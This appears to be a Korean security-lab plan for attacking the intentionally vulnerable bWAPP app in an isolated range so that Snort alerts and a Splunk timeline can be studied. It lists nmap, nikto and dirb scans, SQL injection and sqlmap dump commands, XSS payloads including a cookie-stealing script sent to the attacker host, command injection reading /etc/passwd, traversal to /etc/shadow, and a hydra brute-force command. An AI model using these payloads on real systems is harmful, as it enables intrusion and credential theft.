# Phase 1. 공격 수행

> att-mint(10.50.50.17) → pfSense NAT → Bee-box(10.0.10.50)

---

## 사전 준비

### 도구 설치 (att-mint)

```bash
sudo apt update
sudo apt install -y nmap nikto dirb hydra curl
# sqlmap
sudo apt install -y sqlmap
```

### 접속 확인

```bash
# pfSense NAT를 통해 Bee-box 웹서버 접근
curl -I http://10.0.0.254

# 직접 접근 (DMZ 내부 경로)
ping 10.0.10.50
```

### bWAPP 설정

1. http://10.0.0.254/bWAPP/ 접속
2. bee / bug 로그인
3. Security Level → **low** 설정

---

## 정찰 단계 (Reconnaissance)

### R-1. TCP 포트 스캔

```bash
nmap -sS -p 1-1000 10.0.0.254 -oN scan_tcp.txt
```

- 목적: 열린 포트/서비스 파악
- 예상 결과: 80/tcp open (HTTP)
- Snort 예상 탐지: sfPortscan

**결과:**
> (실습 후 결과 기록)

### R-2. 서비스 버전 탐지

```bash
nmap -sV -O 10.0.0.254 -oN scan_version.txt
```

- 목적: OS, 웹서버 버전 식별
- 예상 결과: Apache, PHP 버전 등

**결과:**
> (실습 후 결과 기록)

### R-3. 웹 취약점 스캔

```bash
nikto -h http://10.0.0.254 -o nikto_result.txt
```

- 목적: 웹서버 취약점 자동 탐색
- Snort 예상 탐지: ET SCAN Nikto Web App Scanner

**결과:**
> (실습 후 결과 기록)

### R-4. 디렉토리 브루트포스

```bash
dirb http://10.0.0.254 -o dirb_result.txt
```

- 목적: 숨겨진 경로/파일 탐색

**결과:**
> (실습 후 결과 기록)

---

## 웹 공격 단계 (Exploitation)

### E-1. SQL Injection (수동)

**bWAPP 메뉴:** SQL Injection (GET/Search)

```
# 인증 우회
' OR 1=1--

# 데이터 추출
' UNION SELECT 1,login,password,4,5,6,7 FROM users--
```

- Snort 예상 탐지: ET WEB_SERVER SQL Injection Attempt

**결과:**
> (실습 후 결과 기록)

### E-2. SQL Injection (sqlmap 자동화)

```bash
# DB 목록 추출
sqlmap -u "http://10.0.0.254/bWAPP/sqli_1.php?title=test&action=search" \
  --cookie="PHPSESSID=<세션값>;security_level=0" \
  --dbs

# 테이블 추출
sqlmap -u "..." --cookie="..." -D bWAPP --tables

# 데이터 덤프
sqlmap -u "..." --cookie="..." -D bWAPP -T users --dump
```

- Snort 예상 탐지: ET WEB_SERVER sqlmap User Agent

**결과:**
> (실습 후 결과 기록)

### E-3. Reflected XSS

**bWAPP 메뉴:** XSS - Reflected (GET)

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
```

- Snort 예상 탐지: ET WEB_SERVER XSS Attempt

**결과:**
> (실습 후 결과 기록)

### E-4. Stored XSS

**bWAPP 메뉴:** XSS - Stored (Blog)

```html
<script>document.location='http://10.50.50.17/steal?c='+document.cookie</script>
```

- 게시글에 저장되어 다른 사용자 접속 시 실행됨

**결과:**
> (실습 후 결과 기록)

### E-5. OS Command Injection

**bWAPP 메뉴:** OS Command Injection

```bash
; whoami
; cat /etc/passwd
; ls -la /
; uname -a
; netstat -an
```

- Snort 예상 탐지: ET WEB_SERVER Command Injection

**결과:**
> (실습 후 결과 기록)

### E-6. Directory Traversal

**bWAPP 메뉴:** Directory Traversal - Files

```
../../../etc/passwd
../../../etc/shadow
```

**결과:**
> (실습 후 결과 기록)

### E-7. Brute Force (hydra)

```bash
# 워드리스트 생성
echo -e "admin\npassword\n123456\nbee\nbug\ntest\nroot" > wordlist.txt

# HTTP POST 브루트포스
hydra -l bee -P wordlist.txt 10.0.0.254 \
  http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid"
```

**결과:**
> (실습 후 결과 기록)

---

## 공격 타임라인

| 시각 | 공격 | 비고 |
|------|------|------|
| 00:00-00:15 | R-1~R-4 정찰 | 스캔성 트래픽 |
| 00:20-00:40 | E-1~E-2 SQL Injection | DB 공격 |
| 00:45-01:00 | E-3~E-4 XSS | 클라이언트 공격 |
| 01:05-01:15 | E-5 Command Injection | 서버 장악 시도 |
| 01:20-01:30 | E-6~E-7 Traversal + Brute Force | 정보수집 + 인증공격 |

> 각 공격을 15~20분 간격으로 수행하여 Splunk 타임라인에서 공격 유형별로 명확히 구분
